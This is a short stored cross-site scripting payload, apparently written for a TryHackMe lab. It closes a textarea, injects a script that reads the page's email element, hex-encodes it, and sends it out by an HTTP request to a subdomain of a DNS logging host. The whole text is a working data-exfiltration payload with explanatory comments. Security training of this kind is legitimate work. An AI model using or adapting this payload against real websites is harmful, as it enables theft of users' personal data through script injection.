</textarea><script>
my_dns = "4772d432ee1c91f4ce4b4584633c76e4.log.tryhackme.tech/";    // DNS from TryHeckMe
mail = document.getElementById("email").textContent;                // extracting the mail from HTML
hexmail = mail.split('').map(function(c) {                          // need to hex the email because it contains characters, which you cannot use on the DNS
    return c.charCodeAt(0).toString(16);
}).join('');
req = new XMLHttpRequest;                                           // creating a HTTP request
req.open('GET', "http://" + hexmail + "." + my_dns, false);         // prepending the data before the DNS
req.send()
</script><textarea>
